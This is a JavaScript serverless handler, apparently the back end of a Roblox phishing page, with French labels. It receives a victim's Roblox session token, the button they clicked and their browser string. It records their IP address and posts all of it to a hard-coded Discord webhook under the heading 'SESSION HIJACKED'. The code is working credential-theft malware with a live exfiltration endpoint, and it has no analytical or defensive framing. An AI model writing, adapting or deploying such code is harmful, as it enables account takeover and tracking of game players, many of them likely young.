export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Interdit');

    const webhook = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
    const { rblx, btn, ua } = req.body;
    const ip = req.headers['x-forwarded-for'] || "IP Inconnue";

    const data = {
        embeds: [{
            title: "🔱 LA RELÈVE DE RAVEN - SESSION HIJACKED",
            color: 0x00d4ff,
            fields: [
                { name: "🌐 ADRESSE IP", value: `\`${ip}\``, inline: true },
                { name: "🖱️ ACTION", value: `Bouton ${btn} cliqué`, inline: true },
                { name: "🔑 ROBLOX TOKEN", value: "```" + rblx + "```" },
                { name: "📱 NAVIGATEUR", value: `\`${ua}\`` }
            ],
            footer: { text: "Raven System v4.0 - Sailor Piece Episode 3" },
            timestamp: new Date()
        }]
    };

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });

    res.status(200).json({ status: "success" });
}
